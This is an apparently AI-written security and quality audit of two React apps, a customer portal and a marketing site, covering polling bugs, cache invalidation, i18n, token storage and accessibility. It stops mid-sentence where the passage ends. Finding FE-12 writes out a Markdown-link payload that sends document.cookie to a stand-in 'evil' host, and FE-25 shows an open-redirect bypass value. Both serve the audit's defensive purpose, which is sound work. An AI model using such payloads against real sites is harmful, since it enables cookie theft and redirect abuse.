# Frontend audit — `apps/portal` + `apps/site`

Scope: `/home/wsl/dev/mjukvarufabriken/.claude/worktrees/deep-review`, branch `review/de…`.
Judged against `.claude/rules/react-tsx.instructions.md`, `react-features`, `rtk-query`,
`react-components` and `templates/web/CLAUDE.md`. Nits already enforced by
`eslint.config.mjs` / `apps/*/eslint.config.mjs` (named exports, `../` imports, pre-typed Redux
hooks, `createApi` ban, `consistent-type-imports`, `rules-of-hooks`, `exhaustive-deps`) are **not**
reported. No `jsx-a11y` or `react-refresh` plugin is configured, so a11y findings below are not
lint-covered.

## Verdict

Both SPAs are unusually disciplined for their age: consistent RTK Query slice shape, no manual
`useMemo`/`useCallback` (React Compiler baseline respected), a real locale-parity test in **both**
apps, and a token-refresh mutex that actually works. The template lineage is clean — divergence is
almost entirely additive feature code, not rot.

Three things are genuinely broken rather than merely improvable:

1. **The portal is English-only in production.** `sv.json` (44 kB) is shipped and tested for key
   parity but no code path can ever load it — no language detector, no `lng`, no switcher, and
   `index.html` is pinned to `lang="en"`. The parity test gives false confidence.
2. **Job polling never stops.** `/orders/:id/job` derives "is the job active?" from a query that
   never refetches, so a delivered/failed/killed job is polled at 3 s forever; `/orders/:id` polls
   the order at 5 s unconditionally, terminal statuses included. No backoff, no visibility gate.
3. **Kill/start/freeze mutations under-invalidate.** `killJob` has no `invalidatesTags` at all;
   `startJob` and the spec mutations never touch the `order` tag. Several screens self-heal only
   because of the runaway polling in (2) — fix (2) first and the staleness becomes visible.

Plus a standing risk decision worth re-confirming: access **and** refresh tokens live in
`localStorage`, so any XSS in the portal is a durable full-account takeover, not a session-scoped
one. The markdown pipeline that feeds `dangerouslySetInnerHTML` escapes raw HTML correctly but not
`javascript:` URLs in Markdown links.

Nothing sensitive leaks through `VITE_*`: the committed `.env*` files contain only a relative
`/bff` API path, titles, the public portal URL, a version and an empty Sentry DSN.

---

## High

### FE-01 Job page polls terminal jobs forever

**Location:** [apps/portal/src/pages/JobPage.tsx](apps/portal/src/pages/JobPage.tsx#L20-L26)

```tsx
const { data: jobs, isLoading, isError } = useGetOrderJobsQuery(orderId, { skip: !orderId })
const latestId = jobs?.[0]?.id
const latestActive = jobs?.[0] ? isActiveJobStatus(jobs[0].status) : false
const { data: job } = useGetJobQuery(latestId ?? '', {
	skip: !latestId,
	pollingInterval: latestActive ? pollingInterval : 0,
})
```

**Why it matters.** `latestActive` is derived from `getOrderJobs`, which has **no
`pollingInterval`** and is only invalidated by `startJob`. Its snapshot is frozen at mount. So:

- Open the page while a job is `running` → `latestActive` stays `true` for the lifetime of the
  page. When the job reaches `delivered` / `failed` / `killed`, `getJob` keeps firing every 3 s and
  `JobEventLog`'s two subscriptions keep firing every 3 s — indefinitely, until the user navigates
  away. On a page left open overnight that is ~29 000 requests per tab against `GET /bff/jobs/:id`
  and `GET /bff/jobs/:id/events`, all returning the same terminal row.
- The mirror-image bug: open the page *before* the job starts and `latestActive` is `false`, so the
  live view never starts polling at all until a manual reload.

Unmount cleanup itself is fine (RTK Query drops the poll with the last subscriber), so this is
purely a "does not stop on terminal status" defect, which is exactly the guarantee the page needs.

**Fix.** Derive activity from the freshest row available, preferring the polled detail:

```tsx
const status = job?.status ?? jobs?.[0]?.status
const latestActive = status ? isActiveJobStatus(status) : false
```

and add a bounded backoff (e.g. 3 s → 10 s → 30 s after N polls) so an unattended tab degrades. See
also FE-06 for the order page's variant of the same problem.

### FE-02 `killJob` invalidates nothing

**Location:** [apps/portal/src/features/jobs/jobsApiSlice.ts](apps/portal/src/features/jobs/jobsApiSlice.ts#L42-L49)

```ts
killJob: build.mutation<Job, string>({
	query: jobId => ({ url: `/admin/jobs/${jobId}/kill`, method: 'POST' }),
	async onQueryStarted(jobId, { dispatch, queryFulfilled }) {
		const { data } = await queryFulfilled
		dispatch(jobsApiSlice.util.upsertQueryData('getJob', jobId, data))
	},
}),
```

**Why it matters.** The `upsertQueryData` patches exactly one cache entry — `getJob(jobId)`.
Everything else that shows the job keeps the pre-kill status:

| Cache entry | Tag it provides | Refreshed by `killJob`? |
| --- | --- | --- |
| `getOrderJobs(orderId)` | `{ job, order-<orderId> }` | no |
| `getOrder(orderId)` | `{ order, <orderId> }` | no |
| `getOrders()` | `{ order, list }` | no |
| `getAdminJobs()` | `adminJobs` | no |
| `getJobEvents({ jobId })` | `{ jobEvents, jobId }` | no |

Killing a build therefore leaves the order stuck showing `building` on `/orders`, and the event log
never picks up the terminating `killed` event. Rule `rtk-query.instructions.md` is explicit that
`invalidatesTags` is how a mutation refreshes a list; the optimistic-update recipe there ends with
"the real server response will replace the optimistic data once `invalidatesTags` triggers a
refetch" — the `invalidatesTags` half is missing here.

**Fix.**

```ts
invalidatesTags: (result, _error, jobId) => [
	{ type: 'jobEvents', id: jobId },
	...(result ? [{ type: 'job' as const, id: `order-${result.orderId}` },
	              { type: 'order' as const, id: result.orderId },
	              { type: 'order' as const, id: 'list' }] : []),
],
```

Keep the `upsertQueryData` for the instant echo; add the tags for correctness.

### FE-03 The portal can never render Swedish

**Locations:**
[apps/portal/src/app/i18n.ts](apps/portal/src/app/i18n.ts#L10-L19),
[apps/portal/index.html](apps/portal/index.html#L2),
[apps/portal/src/layouts/header/Header.tsx](apps/portal/src/layouts/header/Header.tsx#L42-L51)

```ts
.init<HttpBackendOptions>({
	debug: import.meta.env.DEV,
	fallbackLng: 'en',
	supportedLngs: ['en', 'sv'],
	...
```

**Why it matters.** There is no `lng`, and neither `apps/portal/package.json` nor
`apps/site/package.json` depends on `i18next-browser-languagedetector` (deps are `i18next`,
`i18next-http-backend`, `react-i18next` only). With no detector and no explicit `lng`, i18next
resolves to `fallbackLng: 'en'` on every load. `grep -rn "changeLanguage" apps/portal/src` finds
exactly one hit — the HMR handler in `i18n.ts:25`. The header renders `ThemeToggle` and a sign-out
button, no language control. `apps/portal/index.html:2` is `<html lang="en">` and nothing updates
`document.documentElement.lang`.

Consequences: a Swedish customer sees an English portal; `public/locales/sv.json` (44 kB of the
locale folder) is dead weight that is fetched by nobody; and
[apps/portal/test/locales.test.ts](apps/portal/test/locales.test.ts#L36-L41) reports "Has the same
keys in every language" as green while the Swedish UI is unreachable, so the test is measuring
translation hygiene for a language the app cannot select.

The site app got this right — [apps/site/src/app/i18n.ts](apps/site/src/app/i18n.ts#L16) sets
`lng: languageFromPath(window.location.pathname)` and
[SiteLayout.tsx](apps/site/src/layouts/templates/SiteLayout.tsx#L18-L19) syncs both
`document.documentElement.lang` and `i18n.changeLanguage`.

**Fix.** Pick one and implement it end to end:

- add `i18next-browser-languagedetector` (`localStorage` + `navigator` order), a language toggle in
  `Header.tsx`, and a `document.documentElement.lang = i18n.language` sync mirroring `SiteLayout`;
  **or**
- decide the portal is English-only, delete `sv.json`, drop `'sv'` from `supportedLngs`, and reduce
  `apps/portal/test/locales.test.ts` to a single-language key-usage test.

Shipping a tested-but-unreachable locale is the worst of the three.

### FE-04 Access and refresh tokens in `localStorage`

**Locations:**
[apps/portal/src/features/session/sessionSlice.ts](apps/portal/src/features/session/sessionSlice.ts#L13-L14),
[apps/portal/src/features/session/sessionListeners.ts](apps/portal/src/features/session/sessionListeners.ts#L15-L16)

```ts
token: localStorage.getItem('token'),
refreshToken: localStorage.getItem('refreshToken'),
```

```ts
localStorage.setItem('token', token)
localStorage.setItem('refreshToken', refreshToken)
```

**Why it matters.** `localStorage` is readable by any script on the origin and has no expiry. The
blast radius of a single XSS is therefore not "hijack this tab" but "exfiltrate a **refresh** token
and mint access tokens indefinitely from anywhere" — the very thing the mutex-guarded refresh flow
in [apps/portal/src/app/api.ts](apps/portal/src/app/api.ts#L45-L81) is designed to make cheap and
silent. The portal is an admin surface (`job:admin`, customer list, model pricing, resident
billing), so the stolen credential is high value. Persistence across browser restarts also means
a shared/kiosk machine leaks the session.

The API already proves it can do httpOnly cookies — `GithubCallbackPage` is built entirely around
"forwards the browser as a full navigation so the httpOnly state cookie travels along". The same
mechanism is available for the refresh token.

**Fix, in priority order.**

1. Move the **refresh** token to an httpOnly, `Secure`, `SameSite=Lax` cookie scoped to the API
   path, and have `/auth/refresh` read it from the cookie. This alone removes the durable half of
   the blast radius and is the single highest-value change.
2. Keep the short-lived access token in Redux memory only (drop the two `localStorage` calls and
   the two `getItem` seeds); rehydrate on load by calling `/auth/refresh` once.
3. Add a CSP with `script-src 'self'` and no `unsafe-inline` to the SPA's CloudFront response
   headers so an injected script has a much harder time running in the first place.

If the memory-only access token is judged too disruptive for now, at minimum do (1) — the refresh
token is the part that turns a transient bug into a persistent compromise. Record the decision
either way, because right now the storage choice is inherited from `templates/web` rather than
chosen for this threat model.

### FE-05 No error boundary in either SPA

**Locations:**
[apps/portal/src/main.tsx](apps/portal/src/main.tsx#L20-L26),
[apps/site/src/main.tsx](apps/site/src/main.tsx#L14-L15)

```tsx
createRoot(container).render(
	<StrictMode>
		<Provider store={store}>
			<App />
		</Provider>
	</StrictMode>
)
```

**Why it matters.** `grep -rn "ErrorBoundary" apps/portal/src apps/site/src` returns nothing. Any
render-time throw unmounts the whole tree and leaves a blank white page with no recovery path and
no message. The exposure is concrete rather than theoretical, because several components index into
lookup tables keyed by server-supplied enums:

- [JobEventLog.tsx](apps/portal/src/features/jobs/JobEventLog.tsx#L15-L26) `toneByType[event.type]`
  and the `eventText` switch — a new `JobEventType` from the harness falls through to
  `JSON.stringify(payload)` (safe), but
- [OrderStatusBadge.tsx](apps/portal/src/features/orders/OrderStatusBadge.tsx#L11-L21)
  `tone: Record<OrderStatus, string>` and
  [OrderPage.tsx](apps/portal/src/pages/OrderPage.tsx#L26-L46) `nextStep`'s exhaustive `switch`
  return `undefined` for an unknown status, which then flows into `t()` and class joins.

A new order status shipped by the API before the SPA is redeployed is a routine occurrence in this
repo's deploy model, and today it degrades to a blank screen.

Sentry is already initialised in both `main.tsx` files but `Sentry.ErrorBoundary` is never used, so
these crashes are also **not reported** — the one tool that would tell you it happened is wired up
and unused.

**Fix.** Wrap the router in `Sentry.ErrorBoundary` with a translated fallback and a "reload" action,
and add a `errorElement` to the route objects in
[apps/portal/src/app/router.tsx](apps/portal/src/app/router.tsx#L20-L46) so a single page's crash
does not take down the header and navigation with it.

---

## Medium

### FE-06 Order page polls unconditionally, including terminal orders

**Location:** [apps/portal/src/pages/OrderPage.tsx](apps/portal/src/pages/OrderPage.tsx#L60-L69)

```tsx
} = useGetOrderQuery(orderId, {
	skip: !orderId,
	// A payment or a build in flight: keep the page fresh without a manual reload
	pollingInterval: pollingInterval,
})
```

The comment states the intent — "a payment or a build in flight" — but there is no condition
implementing it. `paid` and `cancelled` are terminal; those orders are polled every 5 s for as long
as the tab lives. The nested `useGetJobQuery` on the next lines *does* gate on `latestActive`
(correctly, since `detail` is fresh here), which makes the unconditional outer poll look accidental.

**Fix.** Gate on the status the comment describes, and back off:

```tsx
const settled = detail && ['paid', 'cancelled'].includes(detail.order.status)
pollingInterval: settled ? 0 : pollingInterval,
```

### FE-07 `startJob` does not invalidate the order

**Location:** [apps/portal/src/features/jobs/jobsApiSlice.ts](apps/portal/src/features/jobs/jobsApiSlice.ts#L39-L41)

```ts
startJob: build.mutation<Job, string>({
	query: orderId => ({ url: `/orders/${orderId}/jobs`, method: 'POST' }),
	invalidatesTags: (_result, _error, orderId) => [{ type: 'job', id: `order-${orderId}` }],
}),
```

Starting a build moves the order `deposit_paid` → `building` server-side, but only the job list tag
is invalidated. `getOrders()` (`{ type: 'order', id: 'list' }`) and `getOrder(orderId)` keep the old
status. The button lives on the spec page
([StartBuildButton.tsx](apps/portal/src/features/jobs/StartBuildButton.tsx#L31-L34)), so the user's
next stop is usually `/orders` — which shows a stale badge.

**Fix.** Add `{ type: 'order', id: orderId }` and `{ type: 'order', id: 'list' }`.

### FE-08 Spec mutations never invalidate the order

**Location:** [apps/portal/src/features/spec/specApiSlice.ts](apps/portal/src/features/spec/specApiSlice.ts#L12-L29)

Both `postSpecMessage` and `freezeSpec` write the returned draft straight into the `getSpec` cache
and declare no `invalidatesTags`. `freezeSpec` in particular transitions the order to `frozen` and
assigns `priceSek`/`sizeClass`, and `postSpecMessage` changes `spec.openQuestions` — both of which
`OrderDetail` embeds and renders at
[OrderPage.tsx](apps/portal/src/pages/OrderPage.tsx#L140-L147). Navigating spec → order shows the
pre-freeze state until the 5 s poll from FE-06 happens to land; once FE-06 is fixed, this becomes a
permanent staleness.

**Fix.** Add `invalidatesTags: (_r, _e, arg) => [{ type: 'order', id: orderId }, { type: 'order', id: 'list' }]`
to both (extracting `orderId` from the arg — it is the bare string for `freezeSpec`).

### FE-09 `getJobDeliverables` provides a tag nothing invalidates

**Locations:**
[apps/portal/src/features/jobs/jobsApiSlice.ts](apps/portal/src/features/jobs/jobsApiSlice.ts#L9-L13),
[apps/portal/src/features/jobs/Deliverables.tsx](apps/portal/src/features/jobs/Deliverables.tsx#L28)

```ts
getJobDeliverables: build.query<DeliverablesResponse, string>({
	query: jobId => `/jobs/${jobId}/deliverables`,
	providesTags: (_result, _error, jobId) => [{ type: 'job', id: `deliverables-${jobId}` }],
}),
```

The `deliverables-<jobId>` tag is unique to this endpoint and appears in no `invalidatesTags`
anywhere. The endpoint also keeps the default 120 s cache while every other job query opts into
`ApiCaching.none`. The slice comment says the endpoint "404s until the job's bundle landed", and
`Deliverables` skips until `job.status === 'delivered'` — so the first successful fetch is usually
right at the transition, and the presigned links it returns are described as 15-minute. A user who
leaves the page open past that window has dead download links and no refetch path.

**Fix.** Either invalidate `deliverables-<jobId>` from `killJob`/job-completion, or give the query
`keepUnusedDataFor: ApiCaching.none` plus a refetch when `job.status` flips to `delivered`. Given
the 15-minute link expiry, a `refetchOnMountOrArgChange` is the pragmatic minimum.

### FE-10 Two kill endpoints for one route, with divergent invalidation

**Locations:**
[jobsApiSlice.ts](apps/portal/src/features/jobs/jobsApiSlice.ts#L42-L49) `killJob`,
[adminApiSlice.ts](apps/portal/src/features/admin/adminApiSlice.ts#L30-L33) `killAdminJob`

Both `POST /admin/jobs/:id/kill`. `killAdminJob` invalidates `['adminJobs']` only; `killJob`
invalidates nothing (FE-02). Neither invalidates what the other does, so which caches go stale
depends on which screen the operator used. `useKillJobMutation` is exported but I found no consumer,
making it dead code that will drift further.

**Fix.** Delete `killJob` from `jobsApiSlice`, keep one endpoint, and give it the full tag set from
FE-02 plus `'adminJobs'`.

### FE-11 `JobEventLog` holds two subscriptions to one cache entry

**Location:** [apps/portal/src/features/jobs/JobEventLog.tsx](apps/portal/src/features/jobs/JobEventLog.tsx#L86-L100)

```tsx
const { data: events = [] } = useGetJobEventsQuery(
	{ jobId: job.id, after: 0 },
	{ pollingInterval: active ? pollingInterval : 0 }
)
const after = events.at(-1)?.id ?? 0
useGetJobEventsQuery(
	{ jobId: job.id, after },
	{ pollingInterval: active ? pollingInterval : 0, skip: after === 0 }
)
```

`serializeQueryArgs: ({ queryArgs }) => queryArgs.jobId` collapses both calls onto the **same** cache
entry, so these are two subscribers with different `originalArgs` racing to define what the shared
3 s poll refetches. Which `after` the timer uses is a function of render interleaving rather than
intent; when the `after: 0` subscriber wins, the poll re-downloads the entire event log and `merge`
discards it via the id `Set` — invisible correctness-wise, but it turns an incremental log into a
full re-fetch every 3 s on exactly the long-running jobs the incremental design was built for.

The `merge` also never trims, so a multi-thousand-event job accumulates the whole log in the store
and re-renders the full `<ol>` on every poll.

**Fix.** One subscription, with `after` held in component state and advanced on fulfilment:

```tsx
const [after, setAfter] = useState(0)
const { data: events = [] } = useGetJobEventsQuery({ jobId: job.id, after }, {
	pollingInterval: active ? pollingInterval : 0,
})
useEffect(() => { const last = events.at(-1)?.id; if (last && last !== after) setAfter(last) }, [events, after])
```

### FE-12 Markdown pipeline escapes HTML but not `javascript:` URLs

**Locations:**
[apps/site/src/build/markdown.ts](apps/site/src/build/markdown.ts#L26-L33),
[apps/site/src/features/legal/LegalDocument.tsx](apps/site/src/features/legal/LegalDocument.tsx#L33-L46)

```ts
/**
 * Raw HTML in the Markdown source is shown as text, never shipped as markup: the legal drafts
 * are pasted in from outside the repo and end up in every visitor's browser via innerHTML.
 */
const renderer = new marked.Renderer()
renderer.html = ({ text }) => escapeHtml(text)
```

The raw-HTML override is correct and well reasoned — `<script>` in the source renders as text. But
`marked` removed its sanitiser, and this override only covers the `html` token. A Markdown **link**
or **image** is still emitted as markup with an unvalidated href:

```markdown
[Läs villkoren](javascript:fetch('https://evil/'+document.cookie))
```

renders as `<a href="javascript:...">` and is injected via `dangerouslySetInnerHTML` at
`LegalDocument.tsx:37`. The same applies to `data:text/html` hrefs and `onerror`-free but
`javascript:`-href images.

Severity is Medium, not High, because the input is `legal/*.md` in this repo at **build** time — an
attacker needs commit access, at which point they have better options. But the file's own comment
says the drafts "are pasted in from outside the repo", which is precisely the workflow where a
malicious link survives a skim review by a non-security reader.

**Fix.** Override `renderer.link` (and `image`) to allow only `http:`, `https:`, `mailto:` and
relative hrefs, falling back to rendering the label as plain text. Roughly ten lines, no new
dependency, and it makes the existing comment true for all token types rather than one.

### FE-13 No route-level code splitting in either app

**Location:** [apps/portal/src/app/router.tsx](apps/portal/src/app/router.tsx#L1-L46)

All 13 portal pages are statically imported; `grep -rn "lazy(" apps/portal/src apps/site/src`
returns nothing. Every customer therefore downloads and parses the five admin pages
(`AdminCustomersPage`, `AdminJobsPage`, `AdminOverviewPage`, `AdminPricingPage`,
`AdminResidentPage`) plus their tables and the `residentBilling` module, none of which they can
reach — `Has permissions={['job:admin']}` hides the nav entry but the code is in the main chunk.

**Fix.** `React.lazy` + `Suspense` for the `/admin/*` subtree at minimum (largest win, zero risk
since those routes are permission-gated anyway), then the per-order routes. The site app is small
enough that splitting is optional, though `PrivacyPage`/`TermsPage` carry the build-time legal HTML
strings and are natural split points.

### FE-14 `aria-live` wraps the entire event log

**Location:** [apps/portal/src/features/jobs/JobEventLog.tsx](apps/portal/src/features/jobs/JobEventLog.tsx#L103)

```tsx
<section className={styles.log} aria-live="polite">
	<h2 className={styles.title}>{t('job.log.title')}</h2>
	...
	<ol className={styles.list}>
```

The live region is the whole section, heading and all. Assistive tech announces **additions** to a
live region, so in the common case this behaves; but on the first population it announces the
heading plus every event at once, and any re-render that replaces the `<ol>` (language switch,
tone-class change) re-announces the full log. Combined with FE-11's full re-fetch, a build with a
few hundred events becomes an unusable wall of speech.

Nothing announces the *status* transition itself, which is the one thing a non-sighted user
following a build actually needs.

**Fix.** Move the live region to the list only, mark it as a log, and add a separate polite status
line for the job status:

```tsx
<ol className={styles.list} role="log" aria-live="polite" aria-relevant="additions">
```

plus, in [JobStatusCard.tsx](apps/portal/src/features/jobs/JobStatusCard.tsx), a
`<p role="status">{t(\`job.status.${job.status}\`)}</p>`.

### FE-15 Freeze confirmation is a dialog in name only

**Location:** [apps/portal/src/features/spec/FreezeButton.tsx](apps/portal/src/features/spec/FreezeButton.tsx#L46-L69)

```tsx
<div className={styles.confirm} role="alertdialog" aria-label={t('spec.freeze.confirmTitle')}>
```

`role="alertdialog"` promises modal semantics that are not implemented: no `aria-modal`, no focus
move into the dialog on open, no focus trap, no Escape-to-cancel, and no focus restoration to the
trigger on close. Because the component *replaces* the trigger button in the tree
(`if (confirming) return …`), the previously focused element is unmounted, so keyboard focus falls
back to `<body>` — a keyboard or screen-reader user is dropped to the top of the document at the
exact moment they are being asked to confirm an irreversible, priced commitment.

This is the highest-stakes confirmation in the customer flow (freeze = price locked), which is why
it is listed above the general form issues.

**Fix.** Use the native `<dialog>` element with `showModal()` — it gives focus trapping, Escape and
the backdrop for free — or render the existing markup alongside (not instead of) the trigger, add
`aria-modal="true"`, move focus to the confirm button on mount, and restore it on cancel.

### FE-16 The public site ships an unused auth stack

**Locations:**
[apps/site/src/features/session/sessionSlice.ts](apps/site/src/features/session/sessionSlice.ts#L13-L14),
[apps/site/src/features/session/sessionListeners.ts](apps/site/src/features/session/sessionListeners.ts#L15-L27),
[apps/site/src/app/api.ts](apps/site/src/app/api.ts#L45-L90)

The marketing site has no login route (`diff` confirms `LoginPage.tsx` exists in the template and
**not** in the site), yet it carries the full session slice, the listener middleware that writes
`token`/`refreshToken` to `localStorage`, and the 45-line mutex-guarded 401-refresh base query. The
only endpoint the site actually calls is the contact form.

This is inherited template code, not a live vulnerability — nothing ever dispatches `setTokens` on
the site. But it ships dead bytes on the most performance-sensitive page in the product, and it
leaves a token-writing code path one careless import away from being reachable on a page that
renders build-time HTML via `dangerouslySetInnerHTML` (FE-12).

**Fix.** Delete `features/session/` from the site, drop `sessionSlice` from
[store.ts](apps/site/src/app/store.ts#L12), and reduce `app/api.ts` to a plain `fetchBaseQuery`
without the refresh guard. Reconcile toward the site (the template legitimately needs the auth
stack; the site does not).

---

## Low

### FE-17 `Input` does not associate its error text with the field

**Location:** [apps/portal/src/components/Input.tsx](apps/portal/src/components/Input.tsx#L32-L43)

The implicit `<label>` wrapper is valid and gives an accessible name, so the basic requirement is
met. Missing: `aria-invalid={!!error}` and `aria-describedby` pointing at the error `<span>`, so a
screen-reader user hears the label but not the validation message. Used on the login form
([LoginPage.tsx](apps/portal/src/pages/LoginPage.tsx#L53-L60)) where `error` carries
`page.login.error.failed`.

**Fix.** Generate an id with `useId()`, put it on the error span, and wire both attributes on the
`<input>`.

### FE-18 Ad-hoc byte and dash formatting bypasses i18n

**Locations:**
[Deliverables.tsx](apps/portal/src/features/jobs/Deliverables.tsx#L9-L14),
[JobStatusCard.tsx](apps/portal/src/features/jobs/JobStatusCard.tsx#L61-L65)

```ts
const formatSize = (bytes: number) =>
	bytes < 1024 ? `${bytes} B` : bytes < 1024 ** 2
		? `${Math.round(bytes / 1024)} kB`
		: `${(bytes / 1024 ** 2).toFixed(1)} MB`
```

Unit suffixes are hardcoded English/SI strings and the number is not passed through
`toLocaleString`, so a Swedish locale gets `1.5 MB` where the rest of the page renders `1,5`. The
`'–'` placeholders for missing timestamps are likewise literal. Everything else in the app is
disciplined about `toLocaleString(i18n.language)` (18 call sites), which makes these the exceptions
rather than the rule.

**Fix.** Route through `t('common.size.mb', { value })` with the number pre-formatted, or use
`Intl.NumberFormat(language, { style: 'unit', unit: 'megabyte' })`.

### FE-19 Inline installation form never resyncs from refetched data

**Location:** [apps/portal/src/features/admin/ResidentInstallationsTable.tsx](apps/portal/src/features/admin/ResidentInstallationsTable.tsx#L32-L37)

```tsx
const [orgId, setOrgId] = useState(installation.orgId ?? '')
const [billingCustomerId, setBillingCustomerId] = useState(installation.billingCustomerId ?? '')
```

Props-seeded state with no `key` reset. `upsertResidentInstallation` invalidates
`residentInstallations`, so the row re-renders with fresh props while the local state keeps the old
values; the `dirty` check then compares new props against stale state and can leave the Save button
enabled after a successful save, or show one admin stale values after another admin's edit.

**Fix.** Key the `LinkForm` on the server values —
`<LinkForm key={`${installation.id}-${installation.orgId}-${installation.billingCustomerId}`} … />` —
so React remounts it with the refreshed seed.

### FE-20 Admin pages poll in background tabs

**Locations:**
[AdminOverviewPage.tsx](apps/portal/src/pages/AdminOverviewPage.tsx#L11-L18),
[AdminJobsPage.tsx](apps/portal/src/pages/AdminJobsPage.tsx#L11-L22)

`pollingInterval: 5000` with no `skipPollingIfUnfocused`. RTK Query supports this flag directly and
`setupListeners(store.dispatch)` is already called in
[store.ts](apps/portal/src/app/store.ts#L22), so the plumbing exists.

**Fix.** Add `skipPollingIfUnfocused: true` to these two and to the order/job polls in FE-01/FE-06.

### FE-21 `usePageMeta` silently no-ops and ignores social tags

**Location:** [apps/site/src/hooks/usePageMeta.ts](apps/site/src/hooks/usePageMeta.ts#L4-L21)

```ts
const meta = document.head.querySelector<HTMLMetaElement>(`meta[name="${name}"]`)
if (meta) meta.content = content
```

If the tag is absent from `index.html` the update is dropped without trace, and `og:title` /
`og:description` (which use `property=`, not `name=`) are never touched — so a shared `/en/pricing`
link previews with whatever the Swedish `index.html` shipped. The Effect itself is a legitimate
external-system sync and is correctly dependency-tracked.

**Fix.** Create the tag when missing, and handle `property=` selectors for the Open Graph set.

### FE-22 `lang` flash on English site routes

**Locations:**
[apps/site/index.html](apps/site/index.html#L2),
[apps/site/src/layouts/templates/SiteLayout.tsx](apps/site/src/layouts/templates/SiteLayout.tsx#L18)

`<html lang="sv">` is static; `SiteLayout` corrects it in an Effect after hydration. Between first
paint and that Effect, `/en/*` pages are announced as Swedish. Minor, and the mechanism is right —
only the initial value is wrong.

**Fix.** Set `document.documentElement.lang` from `languageFromPath(location.pathname)` in
`main.tsx` before `createRoot`, alongside the existing `i18n.ts:16` call that already does exactly
this computation.

### FE-23 `billResidentMonth` under-invalidates

**Location:** [apps/portal/src/features/admin/residentApiSlice.ts](apps/portal/src/features/admin/residentApiSlice.ts#L26-L29)

Invalidates `['residentUsage']` but not `['residentInstallations']`, although billing a month
plausibly updates per-installation billing state. Confirm against the API response; if installations
carry no billing-derived field, this is a non-issue.

### FE-24 `SpecChat` message keys can collide

**Location:** [apps/portal/src/features/spec/SpecChat.tsx](apps/portal/src/features/spec/SpecChat.tsx#L52-L55)

```tsx
key={`${message.createdAt}-${index}`}
```

Index participation means keys shift if messages are ever prepended or filtered. The list is
append-only today so this is currently harmless.

**Fix.** Use a server-supplied message id if `SpecDraft.messages` has one.

### FE-25 `safeRedirect` does not normalise backslashes

**Location:** [apps/portal/src/pages/AuthCallbackPage.tsx](apps/portal/src/pages/AuthCallbackPage.tsx#L13-L15)

```ts
const safeRedirect = (value: string | null) =>
	value && value.startsWith('/') && !value.startsWith('//') ? value : '/'
```

The `//` guard is the right instinct and blocks the classic protocol-relative open redirect. It does
not cover `/\evil.com`, which several browsers normalise to `//evil.com`. In practice the value is
handed to React Router's `<Navigate to>`, which resolves it as an in-app path rather than a document
navigation, so this is defence-in-depth rather than a live open redirect.

**Fix.** Reject any value whose second character is `/` or `\`:
`/^\/(?![/\\])/.test(value)`.

---

## Template drift

`templates/web/src` does not exist — the correct comparison base is
`templates/web/apps/app/src`. Divergence is overwhelmingly additive feature code, which is expected
and healthy. Meaningful items only:

| File | Divergence | Reconcile direction |
| --- | --- | --- |
| `app/api.ts` (portal) | Identical except `import type { ApiError }` moved above the `@reduxjs/toolkit` type imports; template uses `@template/models`, portal `@mf/models` | **Neither** — the `@template/*` → `@mf/*` rename is the documented instantiation rule. Import-order difference is cosmetic; align portal to template ordering on next touch |
| `app/api.ts`, `features/session/**` (site) | Full auth stack present but unreachable (no login route) | **To the site** — delete; see FE-16. Template keeps it |
| `app/i18n.ts` (portal) | Template shape kept verbatim: no `lng`, no detector | **To the portal** — see FE-03. The site's `i18n.ts` (`lng: languageFromPath(...)`) is the pattern to copy |
| `app/i18n.ts` (site) | Adds URL-derived `lng`, `defaultLanguage`, `languages` from `routes.ts` | **To the template** — this is strictly better than the template's fallback-only init; promote it |
| `main.tsx` (both) | Adds `Sentry.init` guarded on a DSN | **To the template** — good pattern, but promote it *with* `Sentry.ErrorBoundary` (FE-05), which neither app has |
| `app/router.tsx` (both) | All routes statically imported, matching the template's 4-route shape | **To the template** — introduce the `lazy` + `errorElement` pattern there so instantiated apps inherit it (FE-05, FE-13) |
| `components/Input.tsx` (site vs portal) | Site version adds `required` + `aria-hidden` asterisk; portal version has neither | **To the portal and the template** — the site's is the more complete component |
| `layouts/Has.tsx`, `hooks/usePermission.ts` | Portal differs from template (permission names) | Expected instantiation drift — no action |
| `app/store.ts`, `app/i18n.ts`, `hooks/useEffectOnce.ts`, `features/toasts/ToastItem.tsx`, `components/Input.tsx` (portal) | **Byte-identical** to template | No action — clean lineage |

---

## i18n and a11y summary

**Key parity is genuinely covered, in both apps.** The tests are
[apps/portal/test/locales.test.ts](apps/portal/test/locales.test.ts) and
[apps/site/test/locales.test.ts](apps/site/test/locales.test.ts). Both apps use a **single flat
namespace** per language (`public/locales/{en,sv}.json`), so "all namespaces" is trivially satisfied
— there is no namespace splitting to miss. Each test asserts three things, and the second is
better than most projects manage:

1. identical key sets across `en` and `sv`;
2. every literal `t('a.b')` **and** every template prefix `` t(`a.b.${x}`) `` found by walking
   `src/**/*.{ts,tsx}` exists in the locale (with a `literal.size > 50` guard against the regex
   silently matching nothing);
3. no empty values in any language.

The site's version additionally scrapes `usePageMeta('a', 'b')` argument pairs. Caveats: the regex
only matches single-quoted literals, so `t("a.b")` would be missed (moot — `jsx-quotes` and
Prettier enforce single quotes in TS); and the parity test cannot detect FE-03, where the Swedish
file is perfectly maintained but unreachable.

**No hardcoded user-visible strings found** in the portal — a `grep` for capitalised text nodes
outside `t()` returned zero hits. The exceptions are the unit suffixes and dash placeholders in
FE-18.

**Formatting is consistent**: 18 of 20 numeric/date call sites use
`toLocaleString(i18n.language)`, including currency via
`{ style: 'currency', currency: 'USD' }` in
[residentBilling.ts](apps/portal/src/features/admin/residentBilling.ts#L59). SEK prices go through
the `order.priceValue` translation key with a pre-formatted number rather than `Intl` currency
style — a deliberate and defensible choice, applied uniformly.

**Accessibility** on the real paths:

- *Login* — implicit label via `Input`, submit disabled until the email regex passes, error surfaced
  as text. Missing only the `aria-invalid`/`aria-describedby` wiring (FE-17).
- *Order* — `OrderStepper` has `aria-label`, `ApprovalPanel` is a labelled `section`,
  `OrderStatusBadge` renders translated **text** alongside its tone class, so status is not
  colour-only. `<dl>` is used correctly for the facts list.
- *Spec chat* — the open-question chips are real `<button type="button">` elements (keyboard
  operable), the composer is a real `<form>` with `Cmd/Ctrl+Enter` as an *addition* to the submit
  button rather than a replacement. Good. The freeze confirmation is the weak point (FE-15).
- *Job progress* — `aria-live` present but scoped too broadly, and the status transition itself is
  not announced (FE-14).
- *Admin* — `select` elements carry `aria-label`, `ModelPricesPanel` uses wrapping `<label>`s,
  tables use the shared `Table` component with a `state` prop for loading/error.
- *Headings* — each page renders exactly one `<h1>` and features use `<h2>`; the legal pages
